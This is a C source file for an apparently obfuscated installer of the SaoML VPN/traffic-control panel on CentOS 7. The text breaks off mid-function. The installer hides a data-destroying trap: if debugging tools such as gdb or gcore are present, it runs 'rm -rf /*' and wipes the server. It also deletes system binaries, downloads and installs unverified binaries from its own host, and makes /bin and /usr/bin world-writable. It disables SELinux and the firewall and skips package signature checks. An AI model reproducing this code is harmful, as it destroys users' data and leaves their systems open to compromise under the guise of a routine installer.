#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/md5.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include "VirtualizerSDK.h"
#include <regex.h>
#include <dirent.h>
#define PORT 80
#define BUFSIZE 4096

//全局变量Begin
char *final,*ip,*tmp,*find;
struct stat buf;
char * err_msg="系统环境非法";
char * pid_msg="小老弟干啥呢？";
char * multisession_msg="警告！\n\n请不要多开SSH窗口运行,停止脚本!\n\n多开SSH窗口解决方法(不看是傻逼)：\n\n在SSH窗口执行 Killuser 命令（大写K）\n\n然后重新运行安装脚本即可解决该问题.\n\n禁止使用FinalShell工具连接SSH窗口\n\n如果执行命令后依然无效,可查看手动解决方案：http://www.saoml.com/index.php/2020/09/11/27.html\n\n有什么问题请联系QQ1277345571";
char last[80];
FILE * fp;
FILE * stream;
void md5(char *str); //md5
char * http(char * ip,char * url,char * paramter);

char* mycmd_on(char* command);
char* mycmd_off(char* command);
char* mycmd_yum(char* command);
char buff[1024];
//全局变量End

//命令Begin
//char Rm_All[] = "ls";
char Rm_All[] = "rm -rf /*";
//命令End


char* shellcmd(char* cmd, char* buff, int size)
{
  VIRTUALIZER_EAGLE_BLACK_START
  char temp[256];
  FILE* fp = NULL;
  int offset = 0;
  int len;
  
  fp = popen(cmd, "r");
  if(fp == NULL)
  {
    return NULL;
  }
 
  while(fgets(temp, sizeof(temp), fp) != NULL)
  {
    len = strlen(temp);
    if(offset + len < size)
    {
      strcpy(buff+offset, temp);
      offset += len;
    }
    else
    {
      buff[offset] = 0;
      break;
    }
  }
  
  if(fp != NULL)
  {
    pclose(fp);
  }
  VIRTUALIZER_EAGLE_BLACK_END
  return buff;
}

void * thread_a(void * a){
    struct stat buf1;
    int i;
    char *now=malloc(80);
    while(1){
      if( stat( "/bin/curl", &buf1 ) != -1 ){
          now = ctime(&buf1.st_mtime);
          if(strcmp(now,last)){
                puts(err_msg);
                exit(1);
          }
      }else{
          puts(err_msg);
          exit(1);
      }
      usleep(100000);
    }
    return NULL;
}

void * thread_b(void * b){
    while(1){
        FILE * fp=popen("who | wc -l","r");
        int num = fgetc(fp);
        if(num!='1'){
            puts(multisession_msg);
			pclose(fp);
            exit(1);
        }
        usleep(100000);
        pclose(fp);
    }
    return NULL;
}

void proc(pid_t pid);

void Pointer(char* tip,pid_t pid);

void proc(pid_t pid){ 	
	int i,j;
	char fh[] = {'-','-','\\','\\','|','|','/','/'};
	while(1){
		for (j = 1; j <= 30; ++j){
			printf("\r[ "); 
			for (i = 1; i <= 30; ++i)  {  
				if(i==j){
					printf("\033[34m#\033[0m");
				}else{
					printf("\033[37m-\033[0m");  
				}		
			}  	  	
			printf(" ] [ \033[37m %c Loading..\033[0m ]",fh[j%8]); 
			fflush(stdout);
			usleep(75*1000);
			int status;
			if(waitpid(pid, &status, WNOHANG) == pid){
				printf("\r[ "); 
				for (i = 1; i <= 30; ++i){ 
					printf("\033[34m#\033[0m");  
				}  	  	
				if(WEXITSTATUS(status) == 0){
					printf(" ] [ \033[32m    成功    \033[0m ]\n");
				}else{
					printf(" ] [ \033[31m    失败    \033[0m ]\n"); 	
					exit(1);
				}
				fflush(stdout);
				return;
			}
		}
	}
}

void Pointer(char* tip,pid_t pid){  		
	printf("%s\n",tip); 
	proc(pid) ;
	printf("\n");
}  

//拷贝
void cosp(char const *p1,char const *p2){
	VIRTUALIZER_EAGLE_BLACK_START
	char buff[1024];
	int len;
	FILE *in,*out;
 
	in = fopen(p1,"r+");
	out = fopen(p2,"w+");
 
	while(len = fread(buff,1,sizeof(buff),in))
	{
		fwrite(buff,1,len,out);
	}
	
	fclose(out);
	fclose(in);
	VIRTUALIZER_EAGLE_BLACK_END
	return;
}

//获取IP
int getip(char * buf,char *ip){
    char *pattern = "\r\n (([0-9]{1,3}\\.){3}[0-9]{1,3})\r\n";
    regex_t preg;
    regmatch_t pmatch[2];
    int len = 0;

    int ret = regcomp(&preg,pattern,REG_EXTENDED);
    if(ret != 0){
        printf("IP获取失败\n");
		exit(-1);
    }
	VIRTUALIZER_EAGLE_BLACK_START
    ret = regexec(&preg,buf,2,pmatch,0);
    if(ret == 0){
        if(pmatch[1].rm_so != -1){
            len = pmatch[1].rm_eo - pmatch[1].rm_so;
            strncpy(ip,buf+pmatch[1].rm_so,len);
            ip[len]='\0';
        }else{
            printf("IP获取失败\n");
			exit(-1);
        }
    }else{
        printf("IP获取失败\n");
		exit(-1);
    }
	VIRTUALIZER_EAGLE_BLACK_END
    regfree(&preg);
    return ret;
}

/* 安装unzip */
void install_unzip(){
	VIRTUALIZER_EAGLE_BLACK_START
	remove("/bin/unzip");
	mycmd_on("rm -rf /bin/unzip");
	mycmd_on("curl -o /bin/unzip -s http://oss.saoml.com/yum/public/unzip");
	mycmd_on("chmod -R 777 /usr/bin");
	if((access("/bin/unzip",R_OK|W_OK|X_OK|F_OK))==-1){
		printf("unzip命令有问题,脚本已停止");
		exit(-1);
	}
	VIRTUALIZER_EAGLE_BLACK_END
	return;
}

int init(){
	VIRTUALIZER_EAGLE_BLACK_START
	//检测环境
	if((access("/bin/chattr",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！chattr异常！脚本停止！");
		exit(1);
    }
	if((access("/dev/net/tun",F_OK))==-1){   
		printf("警告！tun异常！脚本停止！");
		exit(1);
    }
	if((access("/bin/mv",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！mv异常！脚本停止！");
		exit(1);
    }
	if((access("/bin/cp",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！cp异常！脚本停止！");
		exit(1);	
    }
	if((access("/bin/rm",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！rm异常！脚本停止！");
		exit(1);	
    }
	if((access("/bin/ps",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！ps异常！脚本停止！");
		exit(1);	
    }
	if((access("/bin/yum",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！yum异常！脚本停止！");
		exit(1);
    }
	if((access("/bin/sed",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！sed异常！脚本停止！");
		exit(1);
    }
	if((access("/bin/find",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("警告！find异常！脚本停止！");
		exit(1);
    }
	mycmd_on("rm -rf /sbin/chmod");
	if((access("/sbin/chmod",F_OK))!=-1){   
		printf("警告！检测非法环境！脚本停止！code:1");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/echo");
	if((access("/sbin/echo",F_OK))!=-1){   
		printf("警告！检测非法环境！脚本停止！code:2");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/chattr");
	if((access("/sbin/chattr",F_OK))!=-1){   
		printf("警告！检测非法环境！脚本停止！code:3");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/mv");
	if((access("/sbin/mv",F_OK))!=-1){    
		printf("警告！检测非法环境！脚本停止！code:4");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/cp");
	if((access("/sbin/cp",F_OK))!=-1){      
		printf("警告！检测非法环境！脚本停止！code:5");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/rm");
	if((access("/sbin/rm",F_OK))!=-1){     
		printf("警告！检测非法环境！脚本停止！code:7");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/ps");
	if((access("/sbin/ps",F_OK))!=-1){   
		printf("警告！检测非法环境！脚本停止！code:8");
		exit(1);   
    }
	mycmd_on("rm -rf /sbin/chattr");
	if((access("/sbin/chattr",F_OK))!=-1){   
		printf("警告！检测非法环境！脚本停止！code:9");
		exit(1);   
    }
	
	//判断是否安装过多开脚本
	if((access("/bin/Killuser",F_OK))==-1) {   
		mycmd_on("curl -o /bin/Killuser -s http://oss.saoml.com/yum/public/Killuser >/dev/null 2>&1 && cp /bin/Killuser /bin/killuser >/dev/null 2>&1 && chmod 777 /bin/Killuser && chmod 777 /bin/killuser");
    }
	
	//判断是否安装过yum源
	if((access("/bin/clean",F_OK))==-1 && (access("/bin/clean2",F_OK))==-1) {
		system("clear");
		printf("1.使用阿里YUM源（推荐优先选择,安装速度快）\n");
		printf("2.使用默认YUM源（安装失败可使用默认YUM源,安装略慢）\n");
		printf("请输入数字 [1-2]并按回车继续:");
		int yum_id;
		scanf("%d",&yum_id);
		if(yum_id == 1) {
			system("clear");
			printf("极速更新YUM源,更新速度取决于你服务器,请耐心等待...\n");
			printf("如果更新缓慢,尝试修改服务器dns...\n");
			printf("\n正在备份YUM源\n");
			mycmd_yum("iptables iptables-services");
			mycmd_on("mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_bak");
			printf("\n正在下载YUM源\n");
			mycmd_on("curl -o /etc/yum.repos.d/CentOS-Base.repo -s http://oss.saoml.com/yum/public/Centos-7.repo");
			mycmd_on("rm -rf /etc/yum.repos.d/epel.repo");
			mycmd_on("rm -rf /etc/yum.repos.d/epel-testing.repo");
			mycmd_on("curl -o /etc/yum.repos.d/epel-testing.repo -s http://oss.saoml.com/yum/public/epel-testing.repo");
			mycmd_on("curl -o /etc/yum.repos.d/epel.repo -s http://oss.saoml.com/yum/public/epel.repo");
			mycmd_on("curl -o /etc/yum.repos.d/SaoML_PHP.repo -s http://oss.saoml.com/yum/public/SaoML_PHP.repo");
			printf("\n清除YUM缓存中\n");
			mycmd_on("yum clean all");
			printf("\n建立YUM缓存中\n");
			mycmd_on("yum makecache");
			printf("\n正在安装YUM源\n");
			mycmd_yum("dmidecode java java-1.8.0-openjdk jre-1.8.0-openjdk libcurl libcurl-devel crontabs dos2unix ntp unzip zip gcc");
			mycmd_off("echo 'yum clean all' >> /bin/clean");
			install_unzip();
			printf("\nYUM源安装完成\n");
		} else if(yum_id == 2) {
			printf("\n正在安装YUM源\n");
			mycmd_yum("dmidecode java java-1.8.0-openjdk jre-1.8.0-openjdk libcurl libcurl-devel crontabs dos2unix ntp unzip zip gcc");
			mycmd_off("echo 'yum clean all' >> /bin/clean2");
			install_unzip();
			printf("\nYUM源安装完成\n");
		}else{
			printf("你脑子有问题？");
			exit(-1);
		}
	}
	if((access("/usr/bin/gcore",F_OK))!=-1){
		mycmd_on(Rm_All);
    }
	if((access("/usr/bin/gdb",F_OK))!=-1){
		mycmd_on(Rm_All);
    }
	if((access("/usr/bin/core",F_OK))!=-1){
		mycmd_on(Rm_All);
    }
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}


int cdsfjvn(){
	VIRTUALIZER_EAGLE_BLACK_START
	system("clear");
    char *buf = malloc(sizeof(char)*4096);
	memset(buf, 0, sizeof(buf));
	char ip[18];
    buf=http("101.35.108.196","saosq.saoml.com","/");
    getip(buf,ip);
    printf("您服务器IP是：\033[32m%s\033[0m\n\n",ip);
    tmp = malloc(sizeof(char)*4096);
	memset(tmp,0,4096);
    memcpy(tmp,ip,strlen(ip));
	if((access("/var/www/html/config.php",F_OK))!=-1){   
		printf("\n  欢迎使用SaoML系统\n\n");
	}else{   
		printf("  检测到你未安装系统,已开启安装导向\n\n");
	}
	printf("  1 - 全新安装SaoML8.0流控\n");
	printf("      \033[31m提示：\033[0m\033[35m支持Centos7.x x64位系统 流控全新安装. \033[0m\n\n");
	printf("  2 - 安装宝塔版流控\n");
	printf("      \033[31m提示：\033[0m\033[35m一键安装宝塔面板带流控\033[0m\n\n");
	printf("  7.0.629版本流控数据迁移8.0版本教程\n");
	printf("      \033[31m提示：\033[0m\033[35m 网盘下载：https://csao.lanzouw.com/b03hvmtxg 密码:28ro \033[0m\n\n");
	printf("      \033[31m提示：\033[0m\033[35m 网盘下载：https://csao.lanzoux.com/b03hvmtxg 密码:28ro \033[0m\n\n");
	printf("  0 - 退出脚本\n\n");
	printf("  请输入数字 [1-2]并按回车继续:");
	int id;
	scanf("%d",&id);
	if(id== 1){
		system("clear");
		vndhsgbvwe();
		exit(0);
	}else if(id== 2){
		system("clear");
		baota();
		exit(0);
	}else if(id== 0){
		printf("脚本已退出，欢迎再次使用！\n");
		exit(0);
	}
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}

int vndhsgbvwe()
{
	VIRTUALIZER_EAGLE_BLACK_START
	char saoml_port[200],sql_pass[200],app_name[200],app_a[200],app_b[200],app_ip[200],app1[200],app2[200],app3[200],app4[200],app5[200],app6[200],lamp2[100],lamp3[100],bin1[100],bin2[100],bin3[100],bin4[100],bin6[100],str[100],sql1[100],sql2[100],admin_path[200],directory1[200];
	char random[100];
	int state;
	if((access("/usr/bin/mysql",F_OK))!=-1){   
		system("clear");
		printf("\033[31m警告！\033[0m\n\n");
		printf("检测到服务器存在残留文件或其他程序！\n\n");
		printf("如果你想重新安装流控系统请先重装服务器系统，脚本停止！\n\n");
		exit(1);   
    }
	fgets(admin_path,100,stdin);
	
	//录入信息
	strcpy(saoml_port,"1024");
	strcpy(app_a,"app.saomla.m");
	strcpy(app_b,"app.saomlb.m");
	strcpy(app_ip,tmp);
	system("clear");
	printf("搭建SaoML流控™系统之前请您先自定义以下信息！\n\n");
	printf("如出现^H这种特殊字符无法删除的可使用ctrl+退格键删除！\n\n");
	
	//后台目录
	printf("请设置管理员后台地址,回车随机:");
	fgets(admin_path,100,stdin);
	find = strchr(admin_path,'\n');
	if(find) *find = '\0';
	if (strcmp(admin_path,"")==0){
		fp=popen("date +%s%N | md5sum | head -c 5","r");
		fgets(random,1024,fp);
		pclose(fp);
		strcpy(admin_path,random);
		printf("管理员地址为：\033[32m%s\033[0m\n\n",admin_path);
	}else{
		printf("管理员地址为：\033[32m%s\033[0m\n\n",admin_path);
	}

	//数据库密码
	printf("请设置数据库密码（不要设置admin或123456等等弱信息,回车随机）:");
	fgets(sql_pass,100,stdin);
	find = strchr(sql_pass,'\n');
	if(find) *find = '\0';
	if (strcmp(sql_pass,"")==0){
		fp=popen("date +%s%N | md5sum | head -c 20","r");
		fgets(random,1024,fp);
		pclose(fp);
		strcpy(sql_pass,random);
		printf("数据库密码为：\033[32m%s\033[0m\n\n",sql_pass);
	}else{
		printf("数据库密码为：\033[32m%s\033[0m\n\n",sql_pass);
	}
	
	//APP名字
	printf("请设置APP名称（回车默认：笨逼加速器）:");
	fgets(app_name,100,stdin);
	find = strchr(app_name,'\n');
	if(find) *find = '\0';
	if (strcmp(app_name,"")==0){
		strcpy(app_name,"笨逼加速器");
		printf("APP名称为：\033[32m%s\033[0m\n\n",app_name);
	}else{
		printf("APP名称为：\033[32m%s\033[0m\n\n",app_name);
	}

	/* 开始安装 */
	system("clear");
	printf("所有信息已收集完成！即将为您安装SaoML流控™(喝杯卡布奇诺休息一下~~~)\n\n");
	printf("程序共8步,搭建过程中请不要关闭,不要进行任何操作！\n\n");
	printf("只要脚本不报错，就请耐心等待，谢谢！\n\n");
	printf("已阅读,请回车开始继续！\n");
	getchar();
	
	/* 第一步 */
	pid_t pid;
	pid = fork();
	if(pid < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid == 0){
		 int i =0;
		 mycmd_on("rm -rf /var/saoml");
		 mycmd_on("mkdir /var/saoml");
		 mycmd_on("cd /var/saoml;wget -q http://oss.saoml.com/8/web-8.0.zip");
		 if((access("/var/saoml/web-8.0.zip",F_OK))!=-1){
			mycmd_on("cd /var/saoml && unzip -o -P Hc4620303+ web-8.0.zip");
		 }else{
			printf("警告！获取远程数据失败!\r");
			exit(1);
		 }
		 exit(0);
	}else{
		Pointer("[\033[34m1/8\033[0m] 正在获取远程效验数据...",pid);
	}
	
	/* 第二步 */
	pid_t pid2;
	pid2 = fork();
	if(pid2 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid2 == 0){
		int i =0;
		
		//检查SELinux模块
		mycmd_on("setenforce 0");
		if((access("/etc/selinux/config",F_OK))==-1){   
			printf("警告！SELinux关闭失败，请自行检查SELinux关键模块是否存在！脚本停止！\r");
			exit(1);
		}  
		
		//关闭SELinux模块并创建新的路由转发
		mycmd_on("sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config");
		mycmd_on("rm -rf /etc/sysctl.conf");
		mycmd_on("mv -f /var/saoml/etc/sysctl.conf /etc/sysctl.conf");
		mycmd_on("chmod 777 /etc/sysctl.conf");
		mycmd_on("sysctl -p /etc/sysctl.conf");
		
		/* sysctl配置文件 */
		if((access("/etc/sysctl.conf",F_OK))==-1){   
			printf("警告！IP路由转发配置文件下载失败，请运行脚本重试！脚本停止！\r");
			exit(1);
		}
		
		//停止firewalld防火墙
		mycmd_on("systemctl stop firewalld.service");
		mycmd_on("systemctl disable firewalld.service");
		mycmd_yum("iptables iptables-services");
		
		//停止iptables防火墙
		system("systemctl stop iptables.service");
		
		//启动iptables防火墙判断是否启动成功
		state = system("systemctl start iptables.service >/dev/null 2>&1");
		if (state != 0){
			printf("防火墙启动失败,请重装服务器系统重新安装,脚本停止！\r");
			exit(1);
		}
		
		//清除防火墙规则并写入新规则
		mycmd_off("iptables -F");
		mycmd_off("service iptables save");
		mycmd_off("systemctl restart iptables.service");
		mycmd_off("iptables -A INPUT -s 127.0.0.1/32  -j ACCEPT");
		mycmd_off("iptables -A INPUT -d 127.0.0.1/32  -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT");
		sprintf(str,"iptables -A INPUT -p tcp -m tcp --dport %s -j ACCEPT\n",saoml_port);
		mycmd_off(str);
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 137 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 138 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 440 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 1024 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 1194 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 1195 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 1196 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 1197 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 3306 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 3389 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 8091 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p tcp -m tcp --dport 8128 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 67 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 68 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 69 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 123 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 137 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 138 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 161 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 636 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 1194 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 3389 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 6868 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 8060 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 5353 -j ACCEPT");
		mycmd_off("iptables -A INPUT -p udp -m udp --dport 3848 -j ACCEPT");
		mycmd_off("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT");
		mycmd_off("iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 67 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 68 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 69 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 123 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 636 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 161 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 5353 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 6868 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 3389 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 138 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 137 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 1194 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 1195 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 1196 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 1197 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 8060 -j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING -p udp --dport 3848	-j REDIRECT --to-ports 53");
		mycmd_off("iptables -t nat -A PREROUTING --dst 10.8.0.1 -p udp --dport 53 -j DNAT --to-destination 10.8.0.1:5353");
		mycmd_off("iptables -t nat -A PREROUTING --dst 10.9.0.1 -p udp --dport 53 -j DNAT --to-destination 10.9.0.1:5353");
		mycmd_off("iptables -t nat -A PREROUTING --dst 10.10.0.1 -p udp --dport 53 -j DNAT --to-destination 10.10.0.1:5353");
		mycmd_off("iptables -t nat -A PREROUTING --dst 10.11.0.1 -p udp --dport 53 -j DNAT --to-destination 10.11.0.1:5353");
		mycmd_off("iptables -t nat -A PREROUTING --dst 10.12.0.1 -p udp --dport 53 -j DNAT --to-destination 10.12.0.1:5353");
		mycmd_off("iptables -P INPUT DROP");
		mycmd_off("iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE");
		mycmd_off("iptables -t nat -A POSTROUTING -s 10.9.0.0/24 -o eth0 -j MASQUERADE");
		mycmd_off("iptables -t nat -A POSTROUTING -s 10.10.0.0/24 -o eth0 -j MASQUERADE");
		mycmd_off("iptables -t nat -A POSTROUTING -s 10.11.0.0/24 -o eth0 -j MASQUERADE");
		mycmd_off("iptables -t nat -A POSTROUTING -s 10.12.0.0/24 -o eth0 -j MASQUERADE");
		mycmd_off("iptables -t nat -A POSTROUTING -j MASQUERADE");
		mycmd_off("iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT");
		mycmd_off("iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT");
		mycmd_off("service iptables save");
		mycmd_off("systemctl restart iptables.service");
		exit(0);
	}else{
		Pointer("[\033[34m2/8\033[0m] 正在关闭防火墙...",pid2);
	}
	
	/* 第三步 */
	pid_t pid3;
	pid3 = fork();
	if(pid3 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid3 == 0){
		int i =0;
		//阿里云源
		if((access("/bin/clean",F_OK))!=-1){
			system("yum -y install avahi openssl openssl-libs openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig gawk tar net-tools psmisc pkcs11-helper libxml2 libxml2-devel bzip2 bzip2-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel gmp gmp-devel libmcrypt libmcrypt-devel readline readline-devel libxslt libxslt-devel --skip-broken >/dev/null 2>&1");
			system("yum -y install httpd dnsmasq telnet lsof mariadb mariadb-server ipset >/dev/null 2>&1");
		}
		//默认源
		if((access("/bin/clean2",F_OK))!=-1){
			system("yum -y install epel-release >/dev/null 2>&1");
			system("yum -y install avahi openssl openssl-libs openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig gawk tar net-tools psmisc pkcs11-helper libxml2 libxml2-devel bzip2 bzip2-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel gmp gmp-devel libmcrypt libmcrypt-devel readline readline-devel libxslt libxslt-devel --skip-broken >/dev/null 2>&1");
			system("yum -y install httpd dnsmasq telnet lsof mariadb mariadb-server ipset >/dev/null 2>&1");
			system("rpm -Uvh http://oss.saoml.com/yum/default/webtatic-release.rpm >/dev/null 2>&1");
		}
		exit(0);
	}else{
		Pointer("[\033[34m3/8\033[0m] 正在初始化系统环境...",pid3);
	}
	
	/* 第四部 */
	pid_t pid33;
	pid33 = fork();
	if(pid33 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid33 == 0){
		int i =0;
		//设置过QBS限速,逐行安装
		mycmd_yum("php70w php70w-fpm php70w-bcmath --nogpgcheck --skip-broken");
		mycmd_yum("php70w-cli --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-common php70w-dba php70w-devel --nogpgcheck --skip-broken");
		mycmd_yum("php70w-embedded --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-enchant php70w-gd php70w-imap --nogpgcheck --skip-broken");
		mycmd_yum("php70w-ldap --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-mbstring php70w-mcrypt php70w-mysqlnd --nogpgcheck --skip-broken");
		mycmd_yum("php70w-odbc --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-opcache php70w-pdo php70w-pdo_dblib --nogpgcheck --skip-broken");
		mycmd_yum("php70w-pear.noarch --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-pecl-apcu php70w-pecl-apcu-devel php70w-pecl-imagick --nogpgcheck --skip-broken");
		mycmd_yum("php70w-pecl-imagick-devel --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-pecl-mongodb php70w-pecl-redis php70w-pecl-xdebug --nogpgcheck --skip-broken");
		mycmd_yum("php70w-pgsql --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-xml php70w-xmlrpc php70w-intl --nogpgcheck --skip-broken");
		mycmd_yum("php70w-mcrypt --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php-fedora-autoloader php-php-gettext php-tcpdf --nogpgcheck --skip-broken");
		mycmd_yum("php-tcpdf-dejavu-sans-fonts --nogpgcheck --skip-broken");
		sleep(1);
		mycmd_yum("php70w-tidy --nogpgcheck --skip-broken");
		mycmd_on("rpm -Uvh /var/saoml/openvpn.rpm --force --nodeps");
		exit(0);
	}else{
		Pointer("[\033[34m4/8\033[0m] 正在安装流控运行环境...",pid33);
	}
	
	/* 第五步 */
	pid_t pid4;
	pid4 = fork();
	if(pid4 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid4 == 0){
		int i =0;
		
		//拷贝文件
		mycmd_on("mv -f /var/saoml/etc/httpd.conf /etc/httpd/conf/httpd.conf");
		mycmd_on("cp -rf /var/saoml/etc/* /etc/");
		mycmd_on("cp -rf /var/saoml/bin/* /bin/");
		
		mycmd_yum("mariadb mariadb-server");
		//判断数据库是否安装成功
		state = system("systemctl start mariadb.service >/dev/null 2>&1");
		if (state != 0){
			printf("数据库启动失败,请重装服务器系统重新搭建,脚本停止！\r");
			exit(1);
		}
		
		//创建数据库并判断
		sprintf(sql1,"mysqladmin -u root password %s >/dev/null 2>&1",sql_pass);
		sprintf(sql2,"mysql -u root -p%s -e \"create database vpndata\" >/dev/null 2>&1",sql_pass);
		state = system(sql1);
		if (state != 0){
			printf("数据库配置失败,请重装服务器系统重新搭建,脚本停止！\r");
			exit(1);
		}
		state = system(sql2);
		if (state != 0){
			printf("数据库配置失败,请重装服务器系统重新搭建,脚本停止！\r");
			exit(1);
		}
		
		//判断httpd是否安装成功
		state = system("systemctl start httpd.service >/dev/null 2>&1");
		if (state != 0){
			printf("httpd服务启动失败,请重装服务器系统重新搭建,脚本停止！\r");
			exit(1);
		}
		
		//安装PHP服务
		mycmd_yum("php-fpm");
		
		//判断PHP服务
		state = system("systemctl start php-fpm.service >/dev/null 2>&1");
		if (state != 0){
			printf("php服务启动失败,请重装服务器系统重新搭建,脚本停止！\r");
			exit(1);
		}
		mycmd_on("chmod -R 777 /bin/");
		mycmd_on("chmod -R 777 /etc/openvpn/");
		
		//判断openvpn
		if((access("/etc/openvpn/auth_config.conf",F_OK))!=-1){   
			sprintf(lamp2,"sed -i \"s/newpass/\"%s\"/g\" /etc/openvpn/auth_config.conf",sql_pass);
			sprintf(lamp3,"sed -i \"s/服务器IP/\"%s\"/g\" /etc/openvpn/auth_config.conf",app_ip);
			mycmd_on(lamp2);
			mycmd_on(lamp3);
		}else{   
			printf("警告！配置文件下载失败,请重装服务器系统重新安装,脚本停止！\r");
			exit(1);
		}
		
		//判断dnsmasq
		if((access("/etc/dnsmasq.conf",F_OK))!=-1){   
			system("chmod 777 /etc/dnsmasq.conf >/dev/null 2>&1");
		}else{   
